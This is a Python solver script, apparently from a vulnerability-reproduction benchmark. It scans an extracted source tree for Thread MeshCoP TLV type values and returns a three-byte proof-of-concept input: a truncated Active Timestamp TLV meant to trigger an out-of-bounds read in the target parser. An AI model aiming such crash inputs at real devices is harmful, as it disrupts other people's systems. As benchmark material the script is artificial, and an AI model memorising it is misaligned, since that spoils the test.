import os
import re
import tarfile
import tempfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        def extract_tar(tar_path, dest_dir):
            with tarfile.open(tar_path) as tf:
                def is_within_directory(directory, target):
                    
                    abs_directory = os.path.abspath(directory)
                    abs_target = os.path.abspath(target)
                
                    prefix = os.path.commonprefix([abs_directory, abs_target])
                    
                    return prefix == abs_directory
                
                def safe_extract(tar, path=".", members=None, *, numeric_owner=False):
                
                    for member in tar.getmembers():
                        member_path = os.path.join(path, member.name)
                        if not is_within_directory(path, member_path):
                            raise Exception("Attempted Path Traversal in Tar File")
                
                    tar.extractall(path, members, numeric_owner=numeric_owner) 
                
                safe_extract(tf, dest_dir)

        def read_text_files(root):
            for dirpath, _, filenames in os.walk(root):
                for fn in filenames:
                    if fn.endswith(('.h', '.hpp', '.hh', '.c', '.cc', '.cpp', '.ipp')):
                        fp = os.path.join(dirpath, fn)
                        try:
                            with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                                yield f.read()
                        except Exception:
                            continue

        def parse_numeric(val):
            val = val.strip()
            try:
                if val.startswith('0x') or val.startswith('0X'):
                    return int(val, 16)
                # Remove potential suffixes like 'u', 'U', 'l', 'L'
                val_clean = re.sub(r'[uUlL]+$', '', val)
                return int(val_clean, 10)
            except Exception:
                return None

        def parse_enum_block(block_text):
            # Remove comments
            block = re.sub(r'/\*.*?\*/', '', block_text, flags=re.S)
            block = re.sub(r'//.*', '', block)
            # Split enumerators by commas not within braces (unlikely inside enums anyway)
            parts = block.split(',')
            mapping = {}
            current = -1
            for part in parts:
                token = part.strip()
                if not token:
                    continue
                # Remove possible trailing/leading braces/spaces
                token = token.strip('{} \t\r\n')
                m = re.match(r'^([A-Za-z_]\w*)(\s*=\s*([^,]+))?$', token)
                if not m:
                    continue
                name = m.group(1)
                val_expr = m.group(3)
                if val_expr:
                    # Try to evaluate numeric or reference previously defined names
                    val_expr = val_expr.strip()
                    num = parse_numeric(val_expr)
                    if num is None:
                        # Attempt simple replacement for references to known names
                        # e.g., name2 = name1 + 1
                        try:
                            expr = val_expr
                            # Replace known names with their values
                            for k, v in mapping.items():
                                expr = re.sub(r'\b' + re.escape(k) + r'\b', str(v), expr)
                            # Remove type casts if any
                            expr = re.sub(r'\([^\)]*\)', '', expr)
                            # Keep only 0x.., digits, +, -, <<, >>, |, &, parentheses, spaces
                            expr = re.sub(r'[^0-9xXa-fA-F\+\-\(\)\s\<\>\|\&]', '', expr)
                            num = eval(expr, {"__builtins__": None}, {})
                            if isinstance(num, int):
                                pass
                            else:
                                num = None
                        except Exception:
                            num = None
                    if num is not None:
                        current = int(num)
                    else:
                        current += 1
                else:
                    current += 1
                mapping[name] = current
            return mapping

        def find_tlv_type_values(root):
            # Try direct numeric assignment first
            direct_pat = re.compile(r'\b(kActiveTimestamp|kPendingTimestamp|kDelayTimer)\b\s*=\s*([0-9xXa-fA-F]+)')
            result = {}
            enum_pat = re.compile(r'enum(?:\s+(?:class|struct))?\s+[^{]*\{([^}]*)\}', re.S)

            for text in read_text_files(root):
                # direct
                for m in direct_pat.finditer(text):
                    name = m.group(1)
                    num = parse_numeric(m.group(2))
                    if num is not None:
                        result[name] = num

                # enum blocks
                for em in enum_pat.finditer(text):
                    block = em.group(1)
                    if any(k in block for k in ('kActiveTimestamp', 'kPendingTimestamp', 'kDelayTimer')):
                        mapping = parse_enum_block(block)
                        for key in ('kActiveTimestamp', 'kPendingTimestamp', 'kDelayTimer'):
                            if key in mapping and key not in result:
                                result[key] = mapping[key]

                # If we have all, we can break early
                if all(k in result for k in ('kActiveTimestamp', 'kPendingTimestamp', 'kDelayTimer')):
                    break

            return result

        tmpdir = tempfile.mkdtemp(prefix='src_extract_')
        try:
            extract_tar(src_path, tmpdir)
        except Exception:
            # If extraction fails, fall back to defaults
            tmpdir = None

        type_map = {}
        if tmpdir:
            try:
                type_map = find_tlv_type_values(tmpdir)
            except Exception:
                type_map = {}

        # Choose the most likely to be parsed/read by the target. Prefer ActiveTimestamp, then PendingTimestamp, then DelayTimer.
        t_active = type_map.get('kActiveTimestamp', None)
        t_pending = type_map.get('kPendingTimestamp', None)
        t_delay = type_map.get('kDelayTimer', None)

        # Reasonable fallbacks if not found
        # Based on Thread MeshCoP TLVs common assignments: ActiveTimestamp=0, PendingTimestamp=1, DelayTimer=8
        if t_active is None:
            t_active = 0
        if t_pending is None:
            t_pending = 1
        if t_delay is None:
            t_delay = 8

        # Build a minimal TLV that will pass vulnerable validation but trigger out-of-bounds read
        # Use Active Timestamp TLV with too-short length (1 byte), placing it at end of input.
        # Format: [Type (1 byte), Length (1 byte), Value...]
        tlv_type = t_active & 0xFF
        poc = bytes([tlv_type, 0x01, 0x00])

        return poc